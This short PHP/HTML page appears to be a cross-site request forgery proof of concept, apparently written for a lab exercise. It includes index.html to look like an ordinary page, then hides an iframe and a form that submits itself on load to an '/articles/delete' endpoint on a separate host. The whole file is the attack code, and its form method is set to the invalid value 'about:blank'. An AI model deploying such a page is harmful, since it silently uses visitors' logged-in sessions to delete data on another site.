<?php include_once("index.html"); ?>

<iframe name="hiddenIFrame" style="display: none;"></iframe>

<form
	action="https://xss-csrf-tp.herokuapp.com/articles/delete"
    method="about:blank"
    id="42"
    target="hiddenIFrame"
>
</form>

<script>
	document.getElementById("42").submit();
</script>

